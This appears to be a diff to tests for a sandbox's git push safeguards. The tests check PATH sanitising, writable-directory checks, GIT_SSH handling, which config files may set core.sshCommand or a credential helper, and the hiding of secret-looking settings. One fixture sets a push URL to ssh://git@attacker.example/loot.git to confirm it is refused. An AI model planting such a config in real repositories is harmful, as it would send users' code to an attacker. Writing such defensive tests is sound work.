@@ -272,7 +272,7 @@ describe("push: the plan", () => {
     const bin = join(repo, "bin");
     expect(safePathFor([repo], `${bin}:/usr/bin:./node_modules/.bin:/bin`).split(":")).not.toContain(bin);
     expect(safePathFor([repo], `${bin}:/usr/bin`).split(":")).toContain("/usr/bin");
-    expect(safePathFor([repo], "node_modules/.bin:.").split(":")).toEqual([dirname(GIT_BIN)]);
+    expect(safePathFor([repo], "node_modules/.bin:.").split(":")).toEqual([...new Set([dirname(GIT_BIN), dirname(realpathSync(GIT_BIN))])]);
     expect(commandProblem(`${bin}/ssh -i k`, [repo])).toContain("may write");
     expect(commandProblem(`!${bin}/helper get`, [repo])).toContain("may write");
     expect(commandProblem(`"${bin}/ssh"`, [repo])).toContain("may write");
@@ -294,7 +294,45 @@ describe("push: the plan", () => {
     const shared = join(root, "shared");
     mkdirSync(shared);
     chmodSync(shared, 0o777);
-    expect(hostPathProblem(join(shared, "ssh"), [], join(root, "elsewhere-home"))).toContain("writable by others");
+    expect(hostPathProblem(join(shared, "ssh"), [], join(root, "elsewhere-home"))).toContain("writable by everyone");
+    // Round 10: group-writable by your own group (Homebrew, Linuxbrew) is fine; the owner must be you or root.
+    const brew = join(root, "brew", "bin");
+    mkdirSync(brew, { recursive: true });
+    chmodSync(brew, 0o775);
+    chmodSync(join(root, "brew"), 0o775);
+    expect(hostPathProblem(join(brew, "git"), [], join(root, "elsewhere-home"))).toBeNull();
+    expect(hostPathProblem("/usr/bin/ssh", [], join(root, "elsewhere-home"))).toBeNull();
+    // GIT_SSH is run as git would (always set explicitly, so the base override's bare ssh never decides).
+    const marker = join(root, "git-ssh-ran");
+    const wrapper = join(root, "my ssh");
+    writeFileSync(wrapper, `#!/bin/sh\ntouch '${marker}'\nexit 1\n`);
+    chmodSync(wrapper, 0o755);
+    const sshPlan = { ...(await planned()), url: "ssh://git@example.invalid/x.git" };
+    process.env.GIT_SSH = wrapper;
+    try {
+      await run(sshPlan, { checkDefault: "allow-unknown", _testFileRemote: false });
+    } finally {
+      delete process.env.GIT_SSH;
+    }
+    expect(existsSync(marker)).toBe(true);
+  });
+
+  test("round 10: what git runs as a program (core.sshCommand, a credential helper) comes from ~/.gitconfig itself, never an include", async () => {
+    const inc = join(root, "dotfiles.gitconfig");
+    writeFileSync(inc, "[core]\n\tsshCommand = ssh -i ~/.ssh/k\n");
+    writeFileSync(join(root, ".gitconfig"), `[include]\n\tpath = ${inc}\n`);
+    expect(await refusal()).toContain("set what git runs (core.sshCommand, a credential helper) in ~/.gitconfig itself");
+    writeFileSync(inc, "[credential]\n\thelper = store\n");
+    expect(await refusal()).toContain("a file your config includes");
+    // Other settings from an include are fine (and shown to the owner); the same command in ~/.gitconfig is too.
+    writeFileSync(inc, "[http]\n\tpostBuffer = 1048576\n");
+    expect(await planned()).toMatchObject({ userSettings: ["global\thttp.postbuffer\t1048576"] });
+    writeFileSync(join(root, ".gitconfig"), "[core]\n\tsshCommand = ssh -i ~/.ssh/k\n");
+    expect(await planned()).toMatchObject({ sshCommand: "ssh -i ~/.ssh/k" });
+    // Shown: a secret-looking value hidden.
+    const { shownSetting } = await import("../daemon/sandbox/push.js");
+    expect(shownSetting("global\thttp.extraheader\tAuthorization: Bearer x")).toBe("http.extraheader = (hidden)");
+    expect(shownSetting("global\thttp.proxy\thttp://p:1")).toBe("http.proxy = http://p:1/");
   });
 
   test("round 7: a tag named like the checked-out branch doesn't change which branch is pushed", async () => {
@@ -389,7 +427,7 @@ describe("push: the plan", () => {
     const team = join(root, "scratch", "team.gitconfig");
     writeFileSync(team, '[remote "origin"]\n\tpushurl = ssh://git@attacker.example/loot.git\n');
     writeFileSync(join(root, ".gitconfig"), `[include]\n\tpath = ${team}\n`);
-    expect(await refusal()).toContain("a file this session's agent can write");
+    expect(await refusal()).toContain("can (or could) write");
     // Round 2: judged by what it names, not what is there now (git reads it again when it pushes).
     writeFileSync(team, "[alias]\n\tst = status\n");
     expect(await refusal()).toContain("includes");
